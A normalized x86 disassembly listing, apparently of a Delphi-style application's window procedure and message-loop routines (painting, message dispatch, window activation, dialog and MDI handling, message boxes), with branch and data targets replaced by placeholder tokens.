lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_469140
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_468a3c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_40361c#5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4688f0
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_469b5c
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4185b0
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_45071c
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46aa88
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_469678
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46961c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_45071c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_469140
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_467ef4
push ebp
call sub_4689b4
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_4689b4
pop ecx
jmp [ eax * 4 + jump_table_468ae0 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_45071c
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4694f4
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455094
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_468948
push ebp
call sub_4689b4
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_4689b4
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_4689b4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420898
jmp r-xdata
xor eax eax
call sub_460858
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_45071c
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44afd4
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46915c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_4689b4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4660f4
jmp r-xdata
push ebp
call sub_4689b4
pop ecx
jmp r-xdata
push ebp
call sub_4689f0
pop ecx
jmp r-xdata
push ebp
call sub_4689b4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_468854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46920c
jmp r-xdata
jmp r-xdata
call sub_43dfe8
call sub_43e0c8
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_468844
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_468854
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46884c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_460708
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_4689b4
pop ecx
jmp r-xdata
call sub_4607bc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_4689b4
pop ecx
jmp r-xdata
call sub_43dfe8
call sub_43e124
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d1fc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46915c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_468844
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_468174
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_45071c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_45071c
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_46920c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_468174
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_45071c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_468854
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_45071c
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_463e80
mov eax [ ebx + 0x44 ]
call sub_46629c
sub_46930c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_469348
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_403fa4
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404040
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_469394
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_4693b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_469408
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_446d00
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_45071c
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_4694c0
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46a420
sub_4694f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_45071c
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403350
test al al
jne r-xdata
sub_469560
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_4694c0
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4693b8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_469408
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_469394
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_4695f8
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_469560
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_469ec8
sub_46961c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418590
mov eax 0x8
call sub_4026dc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_418454
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_469678
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4185b0
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026fc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4184a0
jmp r-xdata
sub_46970c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_40361c#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_4506f8
mov [ esi + 0x44 ] edi
sub_46978c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_46986a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_460680
call sub_407cf8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469871
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_463e80
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_40361c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4695f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_462d88
mov eax [ ebp - 0x4 ]
call sub_46915c
jmp r-xdata
sub_46988c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40276c
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40278c
push eax
call sub_40276c
pop edx
call sub_40b5e0
call sub_40276c
mov edx [ rw-data ]
call sub_4032e0
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40276c
mov edx eax
mov eax ebx
call sub_469a84
pop esi
pop ebx
retn
call sub_40276c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46991c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_460708
mov [ ebp - 0x10 ] eax
call sub_460624
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_4688c0
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_469a71
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469a78
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_4607bc
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_46062c
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_469a84
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469b3f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403fe8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_469348
mov eax [ ebp - 0x108 ]
call sub_404410
push eax
mov eax [ ebp - 0x4 ]
call sub_404410
mov edx eax
mov eax ebx
pop ecx
call sub_46991c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469b46
lea eax [ ebp - 0x108 ]
call sub_403f50
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp - 0x4 ]
call sub_4085b0
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c50
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a68
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404218
sub_469b5c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_4508b8
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_450a20
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46a200
test al al
je r-xdata
call sub_45071c
mov ebp eax
mov eax edi
call sub_45071c
mov ebp eax
mov eax esi
call sub_46a200
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_469cc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
